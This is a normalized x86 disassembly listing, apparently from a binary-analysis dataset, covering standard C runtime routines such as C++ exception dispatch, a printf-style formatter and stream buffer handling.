add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_40d22f
add esp 0xc
test eax eax
jne r-xdata
call sub_40d7e2
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40d340
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_40d187
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40c107
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bfde
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d340
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_40d22f
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_4106e0
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_40d28c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_40d7e2
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_40d740
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40d340
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_40d4f1
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_40be9e
call sub_40bee0
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40d28c
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40d3bb
add esp 0x2c
test eax eax
je r-xdata
sub_40d3bb
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi [ ebp + 0xc ]
mov ecx [ esi - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp + 0x8 ]
mov [ rw-data ] edi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_40bf65
add esp 0x14
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_40d481
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40d481
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
mov [ rw-data ] eax
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] ebx
jne r-xdata
cmp [ ebp - 0x2c ] ebx
je r-xdata
call sub_40c22e
push eax
push edi
call sub_40d6b5
pop ecx
pop ecx
sub_40d4c7
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40d4f1
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_410684
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_410684
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40d7e2
push 0x1
push edi
call sub_4106a0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_410684
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_410684
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_4106a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_4106a0
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_4106a0
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_410770
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_4106bc
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_40d71c
pop ecx
pop ecx
push eax
push edi
call sub_410770
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40d71c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40bed2
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_40d71c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_40bed9
jmp r-xdata
push eax
call sub_40d71c
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_40d6b5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_40bed2
or [ ebp - 0x4 ] 0xffffffff
sub_40d71c
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40d740
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_40c251
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_40c251
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_40d78c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
push 0xa
call sub_4104cd
push 0x16
call sub_41220e
pop ecx
pop ecx
push 0x3
call sub_40fb2e
and [ ebp - 0x4 ] 0x0
sub_40d7e2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_40d78c
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_40d838
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_40eabd
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_410b9a
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_40eabd
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_410b56
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_410abc
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40d94d
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_40e06e ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40e12c
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40e12c
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40e08e
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_40e08e
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40e139
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40e12c
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40e12c
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_40e12c
pop ecx
xor edx edx
call sub_40e12c
pop ecx
jmp r-xdata
call sub_40e12c
pop ecx
movzx eax ax
jmp r-xdata
call sub_40e12c
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_410c80
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_40e12c
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_40e149
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_410cfb
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40e12c
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_410de0
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_410d70
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_40e0f4
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40e0c3
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_40e0f4
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_40e0c3
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_40e0c3
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_40e0f4
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_410cfb
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_40e08e
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_40d838
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_40e0c3
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_40e08e
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_40e0f4
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_40e08e
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40e157
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
